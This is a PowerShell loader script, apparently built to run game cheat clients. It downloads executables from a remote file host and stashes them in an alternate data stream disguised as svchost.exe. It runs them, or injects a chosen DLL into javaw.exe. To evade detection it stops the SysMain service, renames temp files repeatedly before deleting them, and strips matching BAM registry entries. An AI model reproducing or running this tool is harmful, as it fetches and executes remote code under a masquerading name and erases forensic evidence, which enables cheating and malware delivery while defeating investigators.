Clear-Host
Write-Host @"
 |\/\/\/|  
 |      |  
 |      |  
 | (o)(o)  
 C      _)  maked by bridgezan
  | ,___|  
  |   /    
 /____\    
/      \ 
"@
Write-Host "1. EXE Loader" -ForegroundColor Cyan
Write-Host "2. DLL Loader" -ForegroundColor Yellow
$choice = Read-Host "`nSelect an option (1/2)"


function Rename-And-Delete {
    param ([string]$filePath)
    if (-not (Test-Path $filePath)) { Write-Host "    [!] File not found: $filePath" -ForegroundColor DarkRed; return }
    $letters = 'A','B','C','D','E','F','G','H','I','J'
    $dir = Split-Path $filePath
    foreach ($letter in $letters) {
        $namePart = $letter * 12
        $extPart = $letter * 10
        $newName = "$namePart.$extPart"
        $newPath = Join-Path $dir $newName
        try {
            Rename-Item -Path $filePath -NewName $newName -Force -ErrorAction Stop
            Write-Host "    [~] Renamed to: $newName" -ForegroundColor DarkYellow
            $filePath = $newPath
        } catch {
            Write-Host "    [!] Failed to rename to $newName : $($_.Exception.Message)" -ForegroundColor Red
            break
        }
    }

    try {
        Remove-Item -Path $filePath -Force -ErrorAction Stop
        Write-Host "    [+] File deleted successfully" -ForegroundColor Green
    } catch {
        Write-Host "    [!] Failed to delete file: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Remove-BamRegistryEntries {
    param ([string]$adsName)
    $basePath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    $found = $false
    $removedCount = 0
    Write-Host "`n[*] Scanning BAM registry for $adsName entries..." -ForegroundColor Cyan
    try {
        $sids = Get-ChildItem -Path $basePath -ErrorAction Stop | Select-Object -ExpandProperty PSChildName
        foreach ($sid in $sids) {
            $fullPath="$basePath\$sid"
            try {
                $props=Get-ItemProperty -Path $fullPath -ErrorAction Stop
                foreach ($prop in $props.PSObject.Properties) {
                    $remove=$false
                    if ($prop.Name.ToLower() -like "*$adsName*") { $remove=$true } else {
                        try { $val=Get-ItemPropertyValue -Path $fullPath -Name $prop.Name -ErrorAction Stop; if ($val -and $val.ToString().ToLower() -like "*$adsName*") { $remove=$true } } catch {}
                    }
                    if ($remove) { Remove-ItemProperty -Path $fullPath -Name $prop.Name -Force -ErrorAction Stop; $found=$true; $removedCount++ }
                }
            } catch {}
        }
        if ($found) { Write-Host "[+] Removed BAM entries: $removedCount" -ForegroundColor Green } else { Write-Host "[*] No BAM entries found for $adsName" -ForegroundColor Cyan }
    } catch {}
}

if ($choice -eq "1") {
    Write-Host "`n[*] You selected EXE Loader`n" -ForegroundColor Cyan
    $exeList = @(
        @{ Name="akira clicker"; URL="https://abrehamrahi.ir/o/public/M5aNR94M/" },
        @{ Name="exter"; URL="https://abrehamrahi.ir/o/public/P10LtTXg/" },
        @{ Name="exelon"; URL="https://abrehamrahi.ir/o/public/ZodtylCU/" },
        @{ Name="Enthapy"; URL="https://abrehamrahi.ir/o/public/CFrQnUvk/" }
    )

    Write-Host "Available EXE files:"
    for ($i=0; $i -lt $exeList.Count; $i++) { Write-Host "$($i+1). $($exeList[$i].Name)" }
    $exeChoice = Read-Host "`nSelect which EXE to download and run (1-$($exeList.Count))"
    if ($exeChoice -notmatch "^[1-$($exeList.Count)]$") { Write-Host "[!] Invalid choice. Exiting..." -ForegroundColor Red; exit 1 }
    $selectedExe = $exeList[$exeChoice - 1]
    $rnd = -join ((48..57) | Get-Random -Count 4 | ForEach-Object {[char]$_})
    $tempName = "$rnd.tmp"
    $tempPath = Join-Path $env:TEMP $tempName
    $exeUrl = $selectedExe.URL
    $hostFile = "$env:TEMP\update.log"
    $adsName = "svchost.exe"

    Write-Host "[*] Downloading executable from $exeUrl" -ForegroundColor Cyan
    Write-Host "    Destination: $tempPath"
    try { Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -ErrorAction Stop; Write-Host "[+] Download completed successfully" -ForegroundColor Green } catch { Write-Host "[!] Download failed: $_" -ForegroundColor Red; exit 1 }

    if (-not (Test-Path $hostFile)) { New-Item -Path $hostFile -ItemType File -Force | Out-Null; Write-Host "[+] Host file created: $hostFile" -ForegroundColor Green }

    try { Get-Content $tempPath -Encoding Byte -ReadCount 0 | Set-Content -Path "${hostFile}:${adsName}" -Encoding Byte; Write-Host "[+] ADS created successfully: ${hostFile}:${adsName}" -ForegroundColor Green } catch { Write-Host "[!] Failed to create ADS: $_" -ForegroundColor Red; exit 1 }

    $tempExe = Join-Path $env:TEMP $adsName
    try {
        Get-Content "${hostFile}:${adsName}" -Encoding Byte -ReadCount 0 | Set-Content -Path $tempExe -Encoding Byte
        Write-Host "[+] Executable extracted: $tempExe" -ForegroundColor Green
        sc.exe stop SysMain | Out-Null; Write-Host "[*] SysMain service stopped" -ForegroundColor Cyan
        Write-Host "[+] Wait...(15 secounds)" -ForegroundColor Green
        Start-Sleep -Seconds 15
        Start-Process $tempExe; Write-Host "[*] Process started: $tempExe" -ForegroundColor Cyan
    } catch { Write-Host "[!] Failed to extract/execute file: $_" -ForegroundColor Red; exit 1 }

    Write-Host "`n[*] Cleaning temporary files" -ForegroundColor Cyan
    $deleteTmp = Read-Host "    Delete temporary files? [Y/N]"
    if ($deleteTmp -match "^[Yy]$") {
        $maxWait=30; $waited=0
        while ((Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $tempExe }) -and ($waited -lt $maxWait)) { Start-Sleep 1; $waited++ }
        if (Test-Path $tempPath) { Rename-And-Delete -filePath $tempPath }
        if (Test-Path $tempExe) { Rename-And-Delete -filePath $tempExe }
    }
    sc.exe start SysMain | Out-Null; Write-Host "[*] SysMain service started" -ForegroundColor Cyan
    Remove-BamRegistryEntries -adsName "svchost.exe"
    Write-Host "`n[+] EXE Loader operation completed" -ForegroundColor Green
    Read-Host "Press Enter to exit"
}

elseif ($choice -eq "2") {
    Write-Host "`n[*] You selected DLL Loader`n" -ForegroundColor Cyan
    $dllLoaderUrl = "https://abrehamrahi.ir/o/public/MkVxqrPL/"
    $rnd = -join ((48..57) | Get-Random -Count 4 | ForEach-Object {[char]$_})
    $tempName = "$rnd.tmp"
    $tempPath = Join-Path $env:TEMP $tempName
    $hostFile = "$env:TEMP\update.log"

    Write-Host "[*] Downloading DLL loader..." -ForegroundColor Cyan
    Write-Host "    Destination: $tempPath"
    try { Invoke-WebRequest -Uri $dllLoaderUrl -OutFile $tempPath -ErrorAction Stop; Write-Host "[+] Download completed successfully" -ForegroundColor Green } catch { Write-Host "[!] Download failed: $_" -ForegroundColor Red; exit 1 }

    $userDllPath = Read-Host "Enter path to target DLL"
    if (-not (Test-Path $userDllPath)) { Write-Host "[!] DLL path not found: $userDllPath" -ForegroundColor Red; exit 1 }

    $adsName = "svchost.exe"
    if (-not (Test-Path $hostFile)) { New-Item -Path $hostFile -ItemType File -Force | Out-Null }

    try { Get-Content $tempPath -Encoding Byte -ReadCount 0 | Set-Content -Path "${hostFile}:${adsName}" -Encoding Byte; Write-Host "[+] ADS created successfully: ${hostFile}:${adsName}" -ForegroundColor Green } catch { Write-Host "[!] Failed to create ADS: $_" -ForegroundColor Red; exit 1 }

    $tempExe = Join-Path $env:TEMP $adsName
    try {
        Get-Content "${hostFile}:${adsName}" -Encoding Byte -ReadCount 0 | Set-Content -Path $tempExe -Encoding Byte
        Write-Host "[+] DLL loader extracted: $tempExe" -ForegroundColor Green
        sc.exe stop SysMain | Out-Null; Write-Host "[*] SysMain service stopped" -ForegroundColor Cyan
        Start-Process $tempExe -ArgumentList "`"$userDllPath`" javaw.exe"; Write-Host "[*] DLL Loader executed successfully" -ForegroundColor Cyan
    } catch { Write-Host "[!] Failed to execute DLL loader: $_" -ForegroundColor Red; exit 1 }

    Write-Host "`n[*] Cleaning temporary files" -ForegroundColor Cyan
    $deleteTmp = Read-Host "    Delete temporary files? [Y/N]"
    if ($deleteTmp -match "^[Yy]$") {
        $maxWait=30; $waited=0
        while ((Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $tempExe }) -and ($waited -lt $maxWait)) { Start-Sleep 1; $waited++ }
        if (Test-Path $tempPath) { Rename-And-Delete -filePath $tempPath }
        if (Test-Path $tempExe) { Rename-And-Delete -filePath $tempExe }
    }
    sc.exe start SysMain | Out-Null; Write-Host "[*] SysMain service started" -ForegroundColor Cyan
    Remove-BamRegistryEntries -adsName "svchost.exe"
    Write-Host "`n[+] DLL Loader operation completed" -ForegroundColor Green
    Read-Host "Press Enter to exit"
}
else { Write-Host "[!] Invalid choice. Exiting..." -ForegroundColor Red }
